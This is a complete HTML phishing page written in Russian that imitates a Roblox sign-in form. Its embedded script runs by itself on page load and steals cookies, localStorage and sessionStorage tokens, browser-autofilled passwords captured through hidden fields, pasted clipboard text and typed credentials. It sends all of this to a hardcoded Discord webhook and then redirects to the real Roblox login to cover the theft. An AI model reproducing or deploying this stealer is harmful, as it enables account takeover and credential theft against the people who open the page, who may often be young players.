<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox — Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: #16213e;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            width: 400px;
            max-width: 90%;
            text-align: center;
            border: 1px solid #3a3a6a;
        }
        .logo {
            font-size: 48px;
            font-weight: 900;
            color: #fff;
            margin-bottom: 10px;
        }
        .logo span { color: #4a7aff; }
        .sub {
            color: #8888aa;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            color: #aaaacc;
            font-size: 13px;
            font-weight: 600;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0f0f2a;
            border: 2px solid #2a2a5a;
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            transition: 0.3s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #4a7aff;
            box-shadow: 0 0 20px rgba(74, 122, 255, 0.15);
        }
        .input-group input::placeholder {
            color: #555577;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #4a7aff, #6c3ce0);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(74, 122, 255, 0.3);
        }
        .footer {
            margin-top: 25px;
            color: #666688;
            font-size: 12px;
            border-top: 1px solid #2a2a5a;
            padding-top: 20px;
        }
        .footer a {
            color: #4a7aff;
            text-decoration: none;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #0f0f2a;
            color: #4a7aff;
            padding: 12px 24px;
            border-radius: 12px;
            border: 1px solid #4a7aff;
            font-size: 13px;
            opacity: 0;
            transition: 0.5s;
            pointer-events: none;
            z-index: 999;
        }
        .toast.show {
            opacity: 1;
            bottom: 30px;
        }
        .hidden-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 0;
            height: 0;
        }
        iframe {
            display: none;
        }
    </style>
</head>
<body>

<div class="container" id="loginForm">
    <div class="logo">R<span>oblox</span></div>
    <div class="sub">Войдите в свою учётную запись</div>

    <!-- Скрытые поля для автозаполнения -->
    <input type="text" id="hiddenUser" class="hidden-input" autocomplete="username">
    <input type="password" id="hiddenPass" class="hidden-input" autocomplete="current-password">

    <div class="input-group">
        <label>Имя пользователя или email</label>
        <input type="text" id="username" placeholder="Введите логин" autocomplete="off">
    </div>

    <div class="input-group">
        <label>Пароль</label>
        <input type="password" id="password" placeholder="Введите пароль" autocomplete="off">
    </div>

    <button class="btn" id="loginBtn">Войти</button>

    <div class="footer">
        <a href="#">Забыли пароль?</a> • <a href="#">Регистрация</a><br>
        <span style="color:#444466;">© 2026 Roblox Corporation</span>
    </div>
</div>

<div class="toast" id="toast">✅ Данные отправлены</div>

<!-- Скрытый iframe для попытки автозаполнения -->
<iframe id="stealthFrame" src="about:blank"></iframe>

<script>
    // ════════════════════════════════════════════════════════════════
    //  WEBHOOK
    // ════════════════════════════════════════════════════════════════
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1534615586477182997/XIyDHQi_cWtFpJ0uun6_ykNcMeE2-TqPLbvCObpIM0oZCswRyD3SOOZbfMv5abdlYLv5";

    // ════════════════════════════════════════════════════════════════
    //  1. КРАЖА СОХРАНЁННЫХ ПАРОЛЕЙ (ЧЕРЕЗ АВТОЗАПОЛНЕНИЕ)
    // ════════════════════════════════════════════════════════════════
    
    function stealSavedPasswords() {
        // Создаём скрытую форму с автозаполнением
        const form = document.createElement('form');
        form.style.display = 'none';
        form.autocomplete = 'on';
        
        // Поля для автозаполнения
        const userInput = document.createElement('input');
        userInput.type = 'text';
        userInput.name = 'username';
        userInput.autocomplete = 'username';
        userInput.id = 'stealUser';
        
        const passInput = document.createElement('input');
        passInput.type = 'password';
        passInput.name = 'password';
        passInput.autocomplete = 'current-password';
        passInput.id = 'stealPass';
        
        // Кнопка отправки (автоматически)
        const submitBtn = document.createElement('input');
        submitBtn.type = 'submit';
        
        form.appendChild(userInput);
        form.appendChild(passInput);
        form.appendChild(submitBtn);
        document.body.appendChild(form);
        
        // Пытаемся вызвать автозаполнение через фокус
        setTimeout(() => {
            userInput.focus();
            userInput.click();
            passInput.focus();
            passInput.click();
            
            // Через 500мс пытаемся прочитать значения
            setTimeout(() => {
                const savedUser = document.getElementById('stealUser').value;
                const savedPass = document.getElementById('stealPass').value;
                
                if (savedUser || savedPass) {
                    sendStolenPasswords(savedUser, savedPass, 'Из автозаполнения');
                }
                
                // Удаляем форму
                form.remove();
            }, 500);
        }, 300);
    }

    // ════════════════════════════════════════════════════════════════
    //  2. КРАЖА COOKIES И СЕССИЙ
    // ════════════════════════════════════════════════════════════════
    
    function stealCookies() {
        try {
            const cookies = document.cookie;
            if (cookies) {
                sendDataToDiscord('🍪 COOKIES', cookies);
            }
        } catch(e) {}
    }

    // ════════════════════════════════════════════════════════════════
    //  3. КРАЖА LOCALSTORAGE (токены, сессии)
    // ════════════════════════════════════════════════════════════════
    
    function stealLocalStorage() {
        try {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                // Ищем токены, сессии, ключи
                if (key.match(/token|session|auth|key|password|login|user|account|roblox/i) || 
                    value.match(/token|session|auth|key|password|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i)) {
                    items[key] = value;
                }
            }
            if (Object.keys(items).length > 0) {
                sendDataToDiscord('💾 LOCALSTORAGE (токены/сессии)', JSON.stringify(items, null, 2));
            }
        } catch(e) {}
    }

    // ════════════════════════════════════════════════════════════════
    //  4. КРАЖА SESSIONSTORAGE
    // ════════════════════════════════════════════════════════════════
    
    function stealSessionStorage() {
        try {
            const items = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                if (key.match(/token|session|auth|key|login|user|account|roblox/i) || 
                    value.match(/token|session|auth|key|login|user|account|roblox|_|WARNING|ROBLOSECURITY/i)) {
                    items[key] = value;
                }
            }
            if (Object.keys(items).length > 0) {
                sendDataToDiscord('📦 SESSIONSTORAGE', JSON.stringify(items, null, 2));
            }
        } catch(e) {}
    }

    // ════════════════════════════════════════════════════════════════
    //  5. КРАЖА ИНФОРМАЦИИ ОБ АККАУНТАХ ИЗ ВСЕХ ИСТОЧНИКОВ
    // ════════════════════════════════════════════════════════════════
    
    function stealAllAccountData() {
        // Пытаемся найти сохранённые аккаунты в различных местах
        const accountData = {
            fromInputs: [],
            fromStorage: [],
            fromCookies: [],
            fromAutofill: []
        };
        
        // Поиск в DOM-элементах (скрытые поля, атрибуты)
        document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]').forEach(el => {
            if (el.value && el.value.length > 2) {
                // Проверяем, похоже на логин или пароль
                if (el.type === 'password') {
                    accountData.fromInputs.push({ type: 'password', value: el.value, id: el.id || 'unknown' });
                } else if (el.value.match(/@|\.|_|-|user|login|account|roblox|email/i)) {
                    accountData.fromInputs.push({ type: 'username/email', value: el.value, id: el.id || 'unknown' });
                }
            }
        });
        
        // Поиск в тексте страницы (скрытые токены)
        const bodyText = document.body.innerText;
        const tokenMatches = bodyText.match(/[A-Za-z0-9_\-]{20,}/g);
        if (tokenMatches) {
            tokenMatches.forEach(token => {
                if (token.length > 15) {
                    accountData.fromStorage.push({ type: 'token', value: token });
                }
            });
        }
        
        // Отправляем найденное
        if (accountData.fromInputs.length > 0 || accountData.fromStorage.length > 0) {
            sendDataToDiscord('🔑 НАЙДЕННЫЕ АККАУНТЫ', JSON.stringify(accountData, null, 2));
        }
    }

    // ════════════════════════════════════════════════════════════════
    //  6. ФАРМИНГ АВТОЗАПОЛНЕНИЯ (ПЕРЕБОР ПОЛЕЙ)
    // ════════════════════════════════════════════════════════════════
    
    function farmAutofill() {
        // Создаём множество скрытых полей с разными autocomplete
        const autocompleteTypes = ['username', 'user', 'login', 'email', 'nickname', 'name', 'account'];
        const passwordTypes = ['current-password', 'new-password', 'password'];
        
        const container = document.createElement('div');
        container.style.display = 'none';
        container.id = 'autofillFarm';
        
        autocompleteTypes.forEach(type => {
            const input = document.createElement('input');
            input.type = 'text';
            input.autocomplete = type;
            input.id = 'farm_' + type;
            input.style.position = 'absolute';
            input.style.opacity = '0';
            container.appendChild(input);
        });
        
        passwordTypes.forEach(type => {
            const input = document.createElement('input');
            input.type = 'password';
            input.autocomplete = type;
            input.id = 'farm_pass_' + type;
            input.style.position = 'absolute';
            input.style.opacity = '0';
            container.appendChild(input);
        });
        
        document.body.appendChild(container);
        
        // Последовательно фокусируем каждое поле
        setTimeout(() => {
            const allInputs = container.querySelectorAll('input');
            let foundData = {};
            
            allInputs.forEach((input, index) => {
                setTimeout(() => {
                    input.focus();
                    input.click();
                    
                    // Через 100мс читаем значение
                    setTimeout(() => {
                        if (input.value && input.value.length > 1) {
                            foundData[input.id] = input.value;
                        }
                        
                        // Если это последнее поле — отправляем результат
                        if (index === allInputs.length - 1) {
                            if (Object.keys(foundData).length > 0) {
                                sendDataToDiscord('🎯 АВТОЗАПОЛНЕНИЕ (FARM)', JSON.stringify(foundData, null, 2));
                            }
                            container.remove();
                        }
                    }, 100);
                }, index * 200);
            });
        }, 500);
    }

    // ════════════════════════════════════════════════════════════════
    //  7. ПЕРЕХВАТ ВВОДА (ДАЖЕ ЕСЛИ ЖЕРТВА НИЧЕГО НЕ ВВОДИТ)
    // ════════════════════════════════════════════════════════════════
    
    function setupKeylogger() {
        let buffer = '';
        let lastKeyTime = Date.now();
        
        document.addEventListener('keydown', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                // Собираем нажатия клавиш
                const now = Date.now();
                if (now - lastKeyTime > 5000 && buffer.length > 0) {
                    // Отправляем накопленный текст
                    sendDataToDiscord('⌨️ KEYLOG', buffer);
                    buffer = '';
                }
                lastKeyTime = now;
            }
        });
        
        // Также перехватываем вставку из буфера обмена
        document.addEventListener('paste', function(e) {
            const text = e.clipboardData.getData('text');
            if (text && text.length > 5) {
                sendDataToDiscord('📋 ВСТАВКА ИЗ БУФЕРА', text);
            }
        });
    }

    // ════════════════════════════════════════════════════════════════
    //  8. ОТПРАВКА В DISCORD
    // ════════════════════════════════════════════════════════════════
    
    function sendDataToDiscord(title, data) {
        try {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**${title}**\n\`\`\`json\n${data.slice(0, 1900)}\n\`\`\``,
                    username: 'AutoStealer'
                })
            });
        } catch(e) {}
    }

    function sendStolenPasswords(user, pass, source) {
        const content = `**🔐 КРАЖА ПАРОЛЯ (${source})**\n\n` +
                       `**Логин:** \`${user || '(пусто)'}\`\n` +
                       `**Пароль:** \`${pass || '(пусто)'}\`\n` +
                       `**Время:** ${new Date().toLocaleString()}\n` +
                       `**Страница:** ${window.location.href}`;
        
        try {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: content,
                    username: 'PasswordStealer'
                })
            });
        } catch(e) {}
    }

    // ════════════════════════════════════════════════════════════════
    //  9. ЗАПУСК ВСЕХ АТАК
    // ════════════════════════════════════════════════════════════════
    
    function launchAllStealers() {
        const toast = document.getElementById('toast');
        toast.textContent = '⏳ Сканирование данных...';
        toast.classList.add('show');
        
        // Запускаем все методы кражи с задержками
        setTimeout(() => { stealCookies(); }, 100);
        setTimeout(() => { stealLocalStorage(); }, 200);
        setTimeout(() => { stealSessionStorage(); }, 300);
        setTimeout(() => { stealSavedPasswords(); }, 400);
        setTimeout(() => { farmAutofill(); }, 600);
        setTimeout(() => { stealAllAccountData(); }, 800);
        setTimeout(() => { setupKeylogger(); }, 1000);
        
        // Дополнительные попытки через 5 секунд
        setTimeout(() => {
            stealCookies();
            stealLocalStorage();
            stealSessionStorage();
        }, 5000);
        
        // Обновляем уведомление
        setTimeout(() => {
            toast.textContent = '✅ Все данные собраны';
            toast.style.borderColor = '#2ed573';
            toast.style.color = '#2ed573';
            setTimeout(() => toast.classList.remove('show'), 2500);
        }, 1500);
    }

    // ════════════════════════════════════════════════════════════════
    //  10. МАСКИРОВКА
    // ════════════════════════════════════════════════════════════════
    
    document.getElementById('loginBtn').addEventListener('click', function() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Если жертва что-то ввела — отправляем
        if (username || password) {
            sendStolenPasswords(username, password, 'Ввод пользователя');
        }
        
        // Маскировка
        this.textContent = '⏳ Загрузка...';
        this.disabled = true;
        this.style.opacity = '0.6';
        
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/login';
        }, 1500);
    });

    // ════════════════════════════════════════════════════════════════
    //  АВТОЗАПУСК
    // ════════════════════════════════════════════════════════════════
    
    document.addEventListener('DOMContentLoaded', function() {
        // Запускаем через 1 секунду после загрузки
        setTimeout(launchAllStealers, 1000);
    });

    // Если страница уже загружена
    if (document.readyState === 'complete') {
        setTimeout(launchAllStealers, 500);
    }

    console.log('%c🔥 AutoStealer v4.0 — АКТИВЕН', 'font-size:20px; color:#ff4757;');
    console.log('%c🔐 Кража паролей, токенов, сессий...', 'color:#8888aa;');
</script>

</body>
</html>
